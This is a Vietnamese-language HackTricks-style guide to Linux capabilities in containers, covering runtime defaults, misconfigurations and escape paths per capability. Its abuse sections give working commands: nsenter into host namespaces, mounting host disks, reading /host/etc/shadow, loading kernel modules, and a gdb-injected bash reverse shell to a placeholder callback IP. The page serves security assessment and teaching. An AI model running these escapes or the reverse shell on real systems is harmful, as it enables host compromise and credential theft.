# Linux Capabilities Trong Container

{{#include ../../../../banners/hacktricks-training.md}}

## Tổng quan

Linux capabilities là một trong những thành phần quan trọng nhất của bảo mật container, vì chúng giúp trả lời một câu hỏi tinh tế nhưng căn bản: **"root" thực sự có nghĩa là gì bên trong một container?** Trên hệ thống Linux thông thường, theo truyền thống, UID 0 hàm ý một tập quyền rất rộng. Trong các kernel hiện đại, những quyền đó được chia thành các đơn vị nhỏ hơn gọi là capabilities. Một process có thể chạy dưới quyền root nhưng vẫn thiếu nhiều thao tác mạnh nếu các capability tương ứng đã bị loại bỏ. <sup>[[1]](#references)</sup>

Container phụ thuộc rất nhiều vào sự phân biệt này. Nhiều workload vẫn được khởi chạy với UID 0 bên trong container vì lý do tương thích hoặc đơn giản. Nếu không loại bỏ capabilities, điều đó sẽ cực kỳ nguy hiểm. Khi đã loại bỏ capabilities, một process root trong container vẫn có thể thực hiện nhiều tác vụ thông thường bên trong container, đồng thời bị hạn chế thực hiện các thao tác kernel nhạy cảm hơn. Vì vậy, một shell trong container hiển thị `uid=0(root)` không tự động có nghĩa là "root trên host" hay thậm chí là "có quyền kernel rộng". Các capability set quyết định danh tính root đó thực sự có giá trị đến đâu.

Để xem tài liệu tham khảo đầy đủ về Linux capabilities và nhiều ví dụ về cách lạm dụng, hãy xem:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Cách hoạt động

Capabilities được theo dõi trong một số set, bao gồm permitted, effective, inheritable, ambient và bounding. Với nhiều hoạt động đánh giá container, ngữ nghĩa kernel chính xác của từng set không quan trọng bằng câu hỏi thực tế cuối cùng: **process này có thể thực hiện thành công những thao tác đặc quyền nào ngay lúc này, và trong tương lai vẫn có thể đạt được thêm những quyền nào?** <sup>[[1]](#references)</sup>

Điều này quan trọng vì nhiều kỹ thuật breakout thực chất là vấn đề về capability nhưng được ngụy trang thành vấn đề về container. Một workload có `CAP_SYS_ADMIN` có thể truy cập rất nhiều chức năng kernel mà một process root thông thường trong container không nên đụng tới. Một workload có `CAP_NET_ADMIN` sẽ nguy hiểm hơn nhiều nếu nó cũng chia sẻ network namespace của host. Một workload có `CAP_SYS_PTRACE` sẽ đáng chú ý hơn nhiều nếu có thể nhìn thấy các process trên host thông qua việc chia sẻ PID với host. Trong Docker hoặc Podman, cấu hình này có thể xuất hiện dưới dạng `--pid=host`; trong Kubernetes, thường là `hostPID: true`.

Nói cách khác, không thể đánh giá capability set một cách độc lập. Cần xem xét nó cùng với namespaces, seccomp và chính sách MAC.

## Lab

Một cách rất trực tiếp để kiểm tra capabilities bên trong container là:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Bạn cũng có thể so sánh một container bị giới hạn nghiêm ngặt hơn với một container được cấp tất cả capability:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Để thấy tác động của việc chỉ bổ sung một capability, hãy thử loại bỏ mọi thứ rồi chỉ thêm lại một capability:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Những thử nghiệm nhỏ này giúp cho thấy runtime không chỉ bật/tắt một boolean có tên là "privileged". Nó định hình bề mặt đặc quyền thực tế mà tiến trình có thể sử dụng.

## Capabilities Rủi ro Cao

Capabilities chỉ trở thành primitive để escape khi thao tác của chúng tác động đến **tài nguyên do host kiểm soát**. Các tổ hợp rủi ro cao thường gặp là:

- **`CAP_SYS_ADMIN`** cùng với PID của host, thiết bị block hoặc đường dẫn điều khiển kernel có quyền ghi. Việc tham gia mount namespace mục tiêu còn cần `CAP_SYS_CHROOT`; việc mount filesystem dựa trên block cần `CAP_SYS_ADMIN` trong user namespace ban đầu.
- **`CAP_SYS_PTRACE`** cùng với khả năng nhìn thấy PID của host và một tiến trình trên host có thể attach. Không cần `CAP_SYS_ADMIN` để inject qua ptrace.
- **`CAP_DAC_OVERRIDE` hoặc `CAP_DAC_READ_SEARCH`** cùng với filesystem trên host có thể truy cập. Các capability này bỏ qua những kiểm tra DAC khác nhau nhưng không tạo ra góc nhìn filesystem của host.
- **`CAP_SYS_MODULE`** trong user namespace ban đầu cùng với một module được chấp nhận và tương thích với kernel. Các Linux container thông thường dùng chung kernel của node; runtime dùng VM hoặc userspace-kernel thay đổi ranh giới này.
- **`CAP_MKNOD`** trong user namespace ban đầu cùng với một thiết bị thật trên host đã được device cgroup cho phép. Tạo node không bỏ qua device cgroup.
- **`CAP_SYS_RAWIO`** cùng với giao diện bộ nhớ, cổng I/O, PCI hoặc điều khiển thiết bị được expose và có thể sử dụng.
- **`CAP_SYS_BOOT`** cùng với PID namespace ban đầu để reboot host, hoặc một đường dẫn kexec khả dụng và được cho phép để thay kernel.
- **`CAP_NET_ADMIN`** trong network namespace của host để trực tiếp kiểm soát trạng thái mạng của node. **`CAP_NET_RAW`** có thể tham gia vào một kiểu escape phụ thuộc giao thức, nhưng chỉ có raw socket thì không đủ để có shell trên node.

`CAP_SYS_CHROOT` được cố ý không liệt kê như một capability escape độc lập. Nó có thể cần thiết cho `setns()` vào mount namespace và giúp sử dụng cây thư mục trên host đã có thể truy cập dễ dàng hơn, nhưng chỉ gọi `chroot()` không làm lộ cây thư mục đó hay cấp quyền filesystem mới. Tương tự, `CAP_BPF` và `CAP_PERFMON` mở ra khả năng telemetry mạnh mẽ và bề mặt tấn công kernel, nhưng nếu không có lỗ hổng kernel riêng thì các thao tác thông thường của chúng không phải là cách escape container tổng quát.

## Cách Runtime Sử dụng

Docker, Podman, các stack dựa trên containerd và CRI-O đều sử dụng cơ chế kiểm soát capability, nhưng mặc định và giao diện quản lý khác nhau. Docker cho phép cấu hình trực tiếp qua các flag như `--cap-drop` và `--cap-add`. Podman cung cấp các tùy chọn tương tự và thường kết hợp chúng với việc chạy rootless như một lớp an toàn bổ sung. Kubernetes cho phép thêm và loại bỏ capability thông qua `securityContext` của Pod hoặc container; các runtime cấp thấp hơn biểu diễn các tập tương ứng trong cấu hình runtime OCI. Các môi trường system container như LXC và Incus cũng dựa vào cơ chế kiểm soát capability, nhưng khả năng tích hợp sâu hơn với host có thể khiến người vận hành nới lỏng cấu hình mặc định mạnh tay hơn so với khi dùng application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Nguyên tắc này áp dụng cho tất cả các môi trường trên: capability có thể được cấp về mặt kỹ thuật không đồng nghĩa với việc nên cấp nó. Nhiều sự cố ngoài thực tế bắt đầu khi người vận hành thêm một capability chỉ vì workload gặp lỗi với cấu hình nghiêm ngặt hơn và nhóm cần một cách khắc phục nhanh.

## Cấu hình sai

Sai lầm dễ thấy nhất là dùng **`--cap-add=ALL`** trong các CLI kiểu Docker/Podman, nhưng đó không phải vấn đề duy nhất. Trên thực tế, vấn đề thường gặp hơn là cấp một hoặc hai capability cực kỳ mạnh, đặc biệt là `CAP_SYS_ADMIN`, để "giúp ứng dụng hoạt động" mà không hiểu các hệ quả liên quan đến namespace, seccomp và mount. Một lỗi phổ biến khác là kết hợp thêm capability với việc chia sẻ namespace của host. Trong Docker hoặc Podman, điều này có thể xuất hiện dưới dạng `--pid=host`, `--network=host` hoặc `--userns=host`; trong Kubernetes, mức độ expose tương đương thường xuất hiện qua các thiết lập workload như `hostPID: true` hoặc `hostNetwork: true`. Mỗi tổ hợp đó làm thay đổi những gì capability thực sự có thể tác động đến.

Quản trị viên cũng thường cho rằng vì workload không chạy với `--privileged` hoàn toàn nên nó vẫn bị hạn chế đáng kể. Đôi khi điều đó đúng, nhưng đôi khi trạng thái bảo mật thực tế đã gần với privileged đến mức khác biệt này không còn ý nghĩa trong vận hành.

## Lạm dụng

Bắt đầu bằng cách ghi lại các tập quyền hiệu lực, ánh xạ user namespace, trạng thái seccomp, namespace, mount và thiết bị. Tên capability mà không có ngữ cảnh này không chứng minh được rằng đã escape:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: namespaces và block devices

Khi có thể nhìn thấy PID của host, `CAP_SYS_ADMIN` có thể truy cập các namespace của host. Thao tác với mount namespace cũng cần `CAP_SYS_CHROOT` trong user namespace của tiến trình gọi.

**Kiểm tra capability và cơ chế confinement:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Liệt kê mục tiêu:** xác nhận việc chia sẻ PID của host từ cấu hình container/Pod hoặc từ danh sách tiến trình host rõ ràng, sau đó kiểm tra các namespace mục tiêu. PID 1 cục bộ cũng tồn tại trong các PID namespace riêng, vì vậy chỉ riêng sự hiện diện của nó không chứng minh rằng PID của host đang được chia sẻ.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Khai thác đường dẫn namespace:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Các kiểm tra capability phải thành công trong user namespace sở hữu các mục tiêu. `--pid=host` hoặc Kubernetes `hostPID: true` cung cấp khả năng quan sát; chúng không cung cấp capability.

Với phương án thay thế dùng block device, hãy **enumerate** các ứng viên, sau đó **exploit** filesystem có thể truy cập bằng cách trước tiên mount ứng viên đã được xác thực ở chế độ chỉ đọc:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Nút thiết bị phải tồn tại, device cgroup phải cho phép nó, và các mount hệ thống tệp dạng block yêu cầu `CAP_SYS_ADMIN` trong user namespace ban đầu. Quyền root trên host đã được bind-mount tại `/host` đồng nghĩa với quyền truy cập host **mà không cần** `CAP_SYS_ADMIN`; `chroot /host` chỉ là cách tiện lợi và cần riêng `CAP_SYS_CHROOT`.

### Root filesystem của host có thể truy cập: thực thi trực tiếp từ filesystem

Nếu root filesystem của host đã được mount tại `/host`, trước tiên hãy xác nhận mount, sau đó sử dụng trực tiếp quyền truy cập sẵn có. Cách này không phụ thuộc vào `CAP_SYS_ADMIN`:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Nếu `chroot()` không khả dụng nhưng binary của host tương thích với kiến trúc và loader của container, thường có thể gọi nó thông qua cây thư mục đã mount thay thế:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Các thao tác đọc và ghi trực tiếp trong `/host` đã đồng nghĩa với việc xâm phạm hệ thống tệp của host. `chroot()` hoặc thực thi một binary của host chỉ giúp truy cập thuận tiện hơn; không thao tác nào trong số đó tạo mount của host hay vượt qua mount chỉ đọc hoặc chính sách MAC.

### `CAP_SYS_PTRACE`: host-process injection

Khi có thể nhìn thấy PID của host và có `CAP_SYS_PTRACE` trong user namespace của tiến trình mục tiêu, GDB có thể khiến một tiến trình host được phê duyệt gọi `system()`. Không cần `CAP_SYS_ADMIN`.

**Kiểm tra capability và các biện pháp kiểm soát việc gắn vào tiến trình:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Liệt kê và chọn một mục tiêu có thể loại bỏ:** xác nhận việc chia sẻ PID của host qua cấu hình hoặc danh sách tiến trình node rõ ràng; không bao giờ chọn PID 1 hoặc một daemon quan trọng.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Exploit tiến trình đã chọn:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

Target phải cho phép attach và có symbol `system()` cùng đường dẫn Bash payload có thể sử dụng. Yama, trạng thái non-dumpable, seccomp, user namespaces và chính sách MAC có thể chặn chuỗi này. GDB sẽ dừng target khi attach, vì vậy chỉ sử dụng một tiến trình lab có thể loại bỏ.

### `CAP_DAC_OVERRIDE` và `CAP_DAC_READ_SEARCH`: các file host được bảo vệ

Các capability này không làm lộ filesystem của host. Nếu `/host` đã là một host mount, `CAP_DAC_READ_SEARCH` có thể bỏ qua các kiểm tra DAC khi đọc/tìm kiếm, còn `CAP_DAC_OVERRIDE` cũng có thể bỏ qua các kiểm tra ghi thông thường:

**Kiểm tra các capability:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Liệt kê hệ thống tệp của host bị lộ và các quyền trên mục tiêu:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Thử nghiệm các bypass quyền đọc và ghi** trong một lab dùng một lần:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Mount chỉ đọc và các quy tắc LSM vẫn áp dụng. `CAP_DAC_READ_SEARCH` cũng cho phép gọi `open_by_handle_at()`, nhưng một cuộc breakout như Shocker còn cần file descriptor của mount trên cùng filesystem bên dưới, các handle hợp lệ hoặc có thể tìm ra, bố cục filesystem/lưu trữ tương thích và không bị runtime hay LSM chặn. Quyền này không cấp quyền truy cập tùy ý vào mọi filesystem bên ngoài mount namespace.

### `CAP_SYS_MODULE`: thực thi trên kernel dùng chung

Trong một container Linux thông thường, module được chấp nhận sẽ chạy trong kernel dùng chung của host.

**Kiểm tra capability và phạm vi user namespace:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Liệt kê các điều kiện tiên quyết để tải mô-đun:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Chỉ exploit bằng một proof module tương thích, đã được rà soát trước, trên một node dùng một lần:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Capability phải có hiệu lực trong user namespace ban đầu. Phiên bản và cấu hình kernel, chữ ký module, lockdown, seccomp và chính sách LSM phải cho phép tải module. Kata, gVisor, Hyper-V isolation và các runtime tương tự làm thay đổi ranh giới kernel mà workload tiếp cận.

### `CAP_MKNOD`: tạo handle thiết bị được phép

`CAP_MKNOD` tạo một device node nhưng không vượt qua device cgroup. Việc tạo thiết bị không được namespaced, vì vậy capability phải có hiệu lực trong user namespace ban đầu.

**Kiểm tra capability và phạm vi user namespace:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Liệt kê các thiết bị thực, số major/minor của chúng và mọi allowlist cgroup-v1 có thể nhìn thấy:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Exploit một ứng viên thuộc họ ext đã được xác thực ở chế độ chỉ đọc:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Các filesystem khác cần một công cụ chỉ đọc tương ứng; việc mount thiết bị cũng cần `CAP_SYS_ADMIN`. Lỗi `Operation not permitted` khi mở node vừa tạo thường cho biết device cgroup vẫn chặn thao tác này. Trong cgroup v2, quyền truy cập thiết bị thường được thực thi bằng BPF và không có tệp `devices.list`, vì vậy mở thành công là phép thử quyết định.

### `CAP_SYS_RAWIO`: giao diện raw-I/O bị lộ

Không có payload tổng quát, khả chuyển: địa chỉ hợp lệ và tác động phụ thuộc vào phần cứng và cấu hình kernel.

**Kiểm tra capability và phạm vi user namespace:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Liệt kê các giao diện thô, phần cứng và trình điều khiển được phơi bày:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Chỉ khai thác bằng PoC đã được phê duyệt cho thiết bị và dải địa chỉ đã xác định.** Nếu `/dev/mem` là giao diện được phòng lab phê duyệt, mẫu này chứng minh việc làm lộ bộ nhớ nút mà không in nội dung của nó:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Địa chỉ phải lấy từ sơ đồ phần cứng của lab vì việc đọc một số vùng MMIO có thể gây tác dụng phụ. Một lệnh ghi bộ nhớ chung chung sẽ gây hiểu nhầm và không an toàn: cùng một địa chỉ có thể vô hại trên máy này nhưng lại điều khiển phần cứng hoặc bộ nhớ kernel trên máy khác. Device cgroups, quyền filesystem, cấu hình `/dev/mem` nghiêm ngặt, kernel lockdown, virtualization và chính sách LSM thường ngăn cản việc truy cập hữu ích.

### `CAP_SYS_BOOT`: khởi động lại namespace hoặc thay thế kernel

Trong một PID namespace riêng, `reboot()` chấm dứt tiến trình init của namespace đó thay vì khởi động lại host. Vì vậy, để ảnh hưởng đến việc khởi động lại host, cần có initial PID namespace, thường thông qua việc chia sẻ PID của host. Đường dẫn kexec cũng cần một kernel image tương thích cùng chính sách lockdown/chữ ký cho phép:

**Kiểm tra capability:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Liệt kê các điều kiện tiên quyết của PID namespace và kexec:** xác nhận cấu hình workload có chia sẻ PID với host hay không, vì chỉ riêng liên kết đến PID namespace không cho biết đó có phải là namespace ban đầu của node hay không.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Chỉ thực hiện exploit khi khởi động lại một node phòng lab dùng một lần là bài tập được nêu rõ:**

```bash
sync
reboot -f
```

Không chạy lệnh đó hoặc nạp kernel trên một node dùng chung chỉ để chứng minh capability. Trong một PID namespace riêng, thao tác này chỉ kết thúc tiến trình init của namespace đó và không chứng minh được ảnh hưởng đến host.

### `CAP_NET_ADMIN` và `CAP_NET_RAW`: các đường dẫn mạng của host

`CAP_NET_ADMIN` chỉ ảnh hưởng đến network namespace hiện tại.

**Kiểm tra các capability và mức độ cô lập:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Liệt kê mạng hiện tại và xác nhận host networking từ cấu hình workload:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Sử dụng `CAP_NET_ADMIN` theo cách có thể hoàn tác:** với host networking, interface tạm thời là interface của node.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` cho phép tạo socket RAW và PACKET nhưng không phải là shell host đa năng. Để **liệt kê** chuỗi GCE đã được ghi nhận, hãy kiểm tra route metadata và ghi nhận liệu có thể quan sát lưu lượng plaintext của guest-agent hay không:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Nếu có các điều kiện tiên quyết tương ứng, **exploit** chuỗi tấn công đặc thù môi trường như được mô tả trong [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): thu thập request và trạng thái tuần tự, chèn phản hồi metadata giả mạo có chứa SSH key, rồi xác minh quyền truy cập host. Chuỗi này yêu cầu root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, lưu lượng metadata GCE dạng văn bản thuần và một request của guest agent có thể bị khai thác race condition; cơ chế truyền tải hoặc hành vi agent hiện đại có thể khiến cách này thất bại.

### Hạn chế nguồn gốc cục bộ và địa chỉ giao diện

Một listener có thể từ chối các kết nối có nguồn là `127.0.0.1` nhưng bỏ qua một địa chỉ khác được gán cho cùng network namespace. Nếu có thể truy cập listener qua giao diện đó, hãy so sánh kết nối loopback với kết nối được ràng buộc vào một địa chỉ cục bộ không phải loopback đã tồn tại. `CAP_NET_ADMIN` có thể cho phép cấu hình giao diện trong namespace hiện tại, nhưng không cần thiết nếu đã có địa chỉ phù hợp. `CAP_NET_RAW` không phải điều kiện tiên quyết cho kết nối TCP thông thường. Đây là lỗi phân loại địa chỉ nguồn, không phải container escape hay bằng chứng cho thấy ứng dụng sẽ cho phép một request có đặc quyền.<sup>[[1]](#references)[[7]](#references)</sup>

Với listener WebSocket, phản hồi HTTP `101 Switching Protocols` hợp lệ xác nhận quá trình bắt tay ban đầu đã hoàn tất; lỗi ở cấp ứng dụng xuất hiện sau đó có thể cho thấy kết nối đã đến handler. Không phản hồi nào trong số này chứng minh rằng xác thực hoặc thao tác được yêu cầu đã thành công.<sup>[[8]](#references)</sup>

## Kiểm tra

Mục tiêu của việc kiểm tra capabilities không chỉ là trích xuất các giá trị thô, mà còn để xác định liệu tiến trình có đủ đặc quyền khiến tình trạng namespace và mount hiện tại trở nên nguy hiểm hay không.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Điều gì đáng chú ý ở đây:

- `capsh --print` là cách dễ nhất để phát hiện các capability có rủi ro cao như `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` hoặc `cap_sys_module`.
- Dòng `CapEff` trong `/proc/self/status` cho biết những capability nào hiện đang thực sự có hiệu lực, chứ không chỉ những capability có thể có trong các tập khác.
- Việc dump capability càng quan trọng hơn nếu container cũng chia sẻ host PID, network hoặc user namespaces, hoặc có các mount host cho phép ghi.

Sau khi thu thập thông tin capability thô, bước tiếp theo là diễn giải chúng. Hãy xem process có phải là root không, user namespaces có đang hoạt động không, host namespaces có được chia sẻ không, seccomp có đang thực thi chính sách không, và AppArmor hoặc SELinux có tiếp tục hạn chế process không. Chỉ riêng tập capability mới là một phần của bức tranh, nhưng thường chính phần này giải thích vì sao một container breakout thành công còn một trường hợp khác lại thất bại dù có cùng điểm xuất phát tưởng như tương tự.

## Mặc định của runtime

| Runtime / nền tảng | Trạng thái mặc định | Hành vi mặc định | Cách làm suy yếu thường gặp khi cấu hình thủ công |
| --- | --- | --- | --- |
| Docker Engine | Mặc định dùng tập capability đã được giảm bớt | Docker giữ lại một allowlist capability mặc định và loại bỏ các capability còn lại | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Mặc định dùng tập capability đã được giảm bớt | Container Podman mặc định không có đặc quyền và sử dụng mô hình capability đã được giảm bớt | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Kế thừa mặc định của runtime trừ khi có thay đổi | Nếu không chỉ định `securityContext.capabilities`, container sẽ nhận tập capability mặc định của runtime | `securityContext.capabilities.add`, không đặt `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O trong Kubernetes | Thường dùng mặc định của runtime | Tập capability thực tế phụ thuộc vào runtime và Pod spec | Tương tự hàng Kubernetes; cấu hình OCI/CRI trực tiếp cũng có thể thêm capability tường minh |

Đối với Kubernetes, điểm quan trọng là API không định nghĩa một tập capability mặc định chung cho mọi trường hợp. Nếu Pod không thêm hoặc loại bỏ capability, workload sẽ kế thừa mặc định của runtime trên node đó.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Cấu hình container Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Đặc quyền runtime và Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Tài liệu Kubernetes - Thiết lập capability cho container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Tài liệu Podman - `--cap-add` và `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Tài liệu Incus - Bảo mật](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - Triển khai giao thức IPv4 của Linux](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - Giao thức WebSocket](https://www.rfc-editor.org/rfc/rfc6455.html)
